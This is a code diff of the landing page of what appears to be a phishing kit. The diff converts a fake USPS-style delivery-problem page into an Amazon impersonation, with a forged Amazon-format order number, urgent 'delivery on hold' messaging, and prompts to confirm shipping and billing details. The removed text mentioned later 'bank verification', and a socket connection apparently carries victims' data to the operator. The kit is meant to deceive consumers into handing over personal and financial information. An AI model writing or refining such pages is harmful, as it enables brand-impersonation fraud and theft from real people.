@@ -5,15 +5,15 @@ import { getClientId, setActivated } from '../session';
 import { BRAND, BRAND_PROMISES } from '../brand';
 
 function buildOrderNumber(clientId: string) {
-  const seed = (clientId || 'parcelpath-order-seed').replace(/[^a-zA-Z0-9]/g, '');
+  const seed = (clientId || 'amazon-order-seed').replace(/[^a-zA-Z0-9]/g, '');
   let hash = 0;
   for (let i = 0; i < seed.length; i += 1) {
     hash = (hash * 33 + seed.charCodeAt(i)) >>> 0;
   }
 
-  const segment = (length: number, salt: number, prefix = '') => {
+  const segment = (length: number, salt: number) => {
     let value = (hash ^ salt) >>> 0;
-    let out = prefix;
+    let out = '';
     while (out.length < length) {
       value = (value * 1664525 + 1013904223) >>> 0;
       out += String(value % 10);
@@ -21,7 +21,7 @@ function buildOrderNumber(clientId: string) {
     return out.slice(0, length);
   };
 
-  return `${segment(4, 0x9e37, '94')} ${segment(4, 0x85eb)} ${segment(4, 0xc2b2)} ${segment(4, 0x27d4)} ${segment(4, 0x1656)} ${segment(2, 0xa5a5)}`;
+  return `${segment(3, 0x9e37)}-${segment(7, 0x85eb)}-${segment(7, 0xc2b2)}`;
 }
 
 export default function Home() {
@@ -64,6 +64,7 @@ export default function Home() {
       if (!socket.connected) {
         socket.connect();
         socket.once('connect', start);
+        // Best-effort fallback: don't block forever if connect event is missed.
         window.setTimeout(start, 900);
         return;
       }
@@ -75,79 +76,99 @@ export default function Home() {
   };
 
   return (
-    <div className="alz-page alz-usps-page alz-home-compact">
-      <section className="alz-usps-hero" aria-hidden="true">
-        <div className="alz-usps-hero-panel">
-          <div className="alz-usps-hero-panel-top" />
-          <div className="alz-usps-hero-panel-line alz-usps-hero-panel-line-short" />
-          <div className="alz-usps-hero-panel-line" />
-          <div className="alz-usps-hero-panel-line alz-usps-hero-panel-line-mid" />
-          <div className="alz-usps-hero-panel-card" />
-        </div>
-        <div className="alz-usps-hero-blur" />
-        <div className="alz-usps-hero-phone">
-          <div className="alz-usps-hero-phone-notch" />
-          <div className="alz-usps-hero-phone-screen">
-            <div className="alz-usps-hero-appbar" />
-            <div className="alz-usps-hero-card alz-usps-hero-card-top" />
-            <div className="alz-usps-hero-card alz-usps-hero-card-mid" />
-            <div className="alz-usps-hero-card alz-usps-hero-card-low" />
+    <div className="alz-page">
+      <div className="alz-shell">
+        <div className="alz-top">
+          <div className="alz-step-head">
+            <div>
+              <div className="alz-badge">{BRAND.name}</div>
+              <h1 className="alz-step-title">We couldn't complete delivery for this order</h1>
+              <p className="alz-step-subtitle">Confirm your shipping details so delivery can continue.</p>
+            </div>
+          </div>
+          <div className="alz-track mt-3">
+            <span />
           </div>
         </div>
-      </section>
 
-      <div className="alz-shell">
-        <section className="alz-usps-intro">
-          <div className="alz-usps-intro-copy">
-            <div className="alz-usps-eyebrow">Tracking Update</div>
-            <h1 className="alz-usps-title">Action required to continue delivery</h1>
-            <p className="alz-usps-lead">
-              A delivery detail could not be confirmed. Review the shipment information first. Bank verification may be required later.
-            </p>
-            <div className="alz-brand-row alz-home-brand-row">
+        <div className="alz-home-grid alz-home-order-layout">
+          <div className="alz-card alz-home-main-card">
+            <div className="alz-home-kicker">Order summary</div>
+            <div className="alz-order-header">
+              <div>
+                <h2 className="alz-page-title">Delivery is on hold pending address confirmation</h2>
+                <p className="alz-page-copy">
+                  We were unable to complete delivery using the address currently associated with this order. Review the delivery details below to continue.
+                </p>
+              </div>
+              <div className="alz-order-id">
+                <span>Order #</span>
+                <strong>{orderNumber}</strong>
+              </div>
+            </div>
+
+            <div className="alz-home-mobile-strip">
+              <span>Order #{orderNumber}</span>
+              <strong>On hold</strong>
+            </div>
+
+            <div className="alz-order-product">
+              <div className="alz-order-product-thumb" />
+              <div className="alz-order-product-copy">
+                <div className="alz-order-product-title">This order requires delivery confirmation</div>
+                <div className="alz-order-product-meta">1 item cannot be delivered until the shipping information is confirmed.</div>
+                <div className="alz-order-product-meta">Order placed {orderPlacedDate}</div>
+              </div>
+              <div className="alz-order-product-price">On hold</div>
+            </div>
+
+            <div className="alz-order-panel-grid">
+              <section className="alz-order-panel">
+                <div className="alz-order-panel-title">Why Amazon is asking for this</div>
+                <div className="alz-order-panel-copy">A mismatch was detected in the delivery information associated with this order. Confirm the details to release the shipment.</div>
+                <div className="alz-order-panel-meta">
+                  <span>This shipment is currently on hold</span>
+                  <strong>Delivery resumes after confirmation</strong>
+                </div>
+              </section>
+            </div>
+
+            <div className="alz-brand-row">
               {BRAND_PROMISES.map((item) => (
                 <span key={item} className="alz-brand-pill">{item}</span>
               ))}
             </div>
-            <div className="alz-usps-action-row alz-home-action-row">
+
+            <div className="alz-order-action">
+              <div className="alz-order-action-alert">Confirm this order now to avoid additional delivery delays.</div>
               <button onClick={handleContinue} disabled={loading} className="alz-btn-primary alz-btn-primary-home text-base">
-                {loading ? 'Opening...' : 'Review shipment details'}
+                {loading ? 'Opening...' : 'Confirm shipping details'}
               </button>
-              <p className="alz-usps-action-note">Estimated time: about 2 minutes.</p>
+              <p className="alz-helper-copy">Usually takes less than 2 minutes.</p>
             </div>
-          </div>
-          <div className="alz-usps-track-card">
-            <div className="alz-usps-track-head">
-              <div className="alz-usps-track-label">Tracking Number</div>
-              <div className="alz-usps-track-badge">ACTIVE</div>
-            </div>
-            <div className="alz-usps-track-number">{orderNumber}</div>
-            <div className="alz-usps-track-meta">Updated {orderPlacedDate}</div>
-            <div className="alz-usps-track-state">Shipment review required</div>
-          </div>
-        </section>
 
-        <section className="alz-home-quick-grid">
-          <article className="alz-usps-service-card alz-home-quick-card">
-            <div className="alz-usps-service-kicker">Required Information</div>
-            <div className="alz-home-quick-list">
-              <div>Recipient name and street address</div>
-              <div>ZIP Code, phone number, and email</div>
-              <div>Bank verification may be requested later</div>
-            </div>
-          </article>
-          <article className="alz-usps-service-card alz-home-quick-card">
-            <div className="alz-usps-service-kicker">Delivery Status</div>
-            <div className="alz-home-quick-list">
-              <div>Current status: Delivery on hold</div>
-              <div>Service type: Standard parcel</div>
-              <div>Next step: Confirm recipient details</div>
-            </div>
-          </article>
-        </section>
+            <div className="alz-footer">{BRAND.name} | {BRAND.tagline}</div>
+            <div className="text-[11px] text-[#565959] mt-1">{BRAND.legal}</div>
+          </div>
 
-        <div className="alz-footer">{BRAND.name} | {BRAND.tagline}</div>
-        <div className="text-[11px] text-[#565959] mt-1">{BRAND.legal}</div>
+          <aside className="alz-card alz-home-aside-card alz-side-summary">
+            <div className="alz-side-summary-title">Delivery update</div>
+            <div className="alz-order-mini-card">
+              <div className="alz-order-mini-thumb" />
+              <div>
+                <div className="alz-order-mini-title">Shipment requires confirmation</div>
+                <div className="alz-order-mini-copy">1 item in this order requires updated delivery information.</div>
+              </div>
+            </div>
+            <div className="alz-side-summary-list">
+              <div>Delivery address review</div>
+              <div>Billing information check</div>
+              <div>Shipment release pending</div>
+            </div>
+            <div className="alz-side-summary-box">Delivery resumes after the required information is confirmed.</div>
+            <div className="alz-side-summary-help">Need help? Visit Customer Service for assistance with your order.</div>
+          </aside>
+        </div>
       </div>
     </div>
   );
